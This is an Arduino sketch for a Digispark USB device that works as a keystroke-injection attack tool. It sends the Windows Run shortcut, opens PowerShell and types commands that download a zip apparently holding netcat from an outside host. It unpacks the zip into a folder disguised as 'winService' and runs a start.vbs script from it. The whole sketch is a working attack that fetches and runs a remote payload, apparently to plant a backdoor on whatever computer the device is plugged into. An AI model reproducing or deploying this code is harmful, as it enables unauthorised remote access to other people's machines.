#define kbd_tr_tr
#define LEDPIN 1
#include "DigiKeyboard.h"
#include <limits.h>

void setup() {
  // put your setup code here, to run once:
  pinMode(LEDPIN,OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  digitalWrite(LEDPIN,HIGH);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Invoke-Webrequest -URI 'https://ieucyber.com/archive/nc64.zip' -Outfile 'nc.zip'");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Expand-Archive -Path nc.zip -DestinationPath winService/");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd winService");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Start-Process -FilePath start.vbs");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}
